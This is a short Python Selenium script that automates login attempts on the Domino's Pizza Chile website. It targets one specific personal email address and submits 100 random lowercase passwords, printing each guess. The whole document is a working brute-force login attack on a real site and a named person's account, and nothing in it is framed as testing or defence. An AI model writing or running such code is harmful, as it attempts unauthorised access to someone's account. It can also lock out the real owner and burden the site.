import string
import time
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome(executable_path=r"C:\Selenium\chromedriver.exe")
driver.get('https://www.dominospizza.cl')
time.sleep(3)
letters = string.ascii_lowercase
driver.find_element_by_xpath("//*[@id='iniciaSesion']").click()
time.sleep(3)
for x in range(100):
        username = driver.find_element_by_id("user_email")
        username.clear()
        
        username.send_keys("ma.luengo3@gmail.com")
        time.sleep(3)
        pwd = driver.find_element_by_id("user_password")
        
        newText = ''.join(random.choice(letters) for j in range(random.randrange(6,21)))
        pwd.send_keys(newText)
        print("password: "+ newText)
        driver.find_element_by_xpath("//*[@id='submit-login']").click()
        
        pwd.clear()

    
driver.close()



#<input class="form-control font-oxygen" type="text" name="user[email]" id="user_email">
#<input class="form-control font-oxygen" type="password" name="user[password]" id="user_password">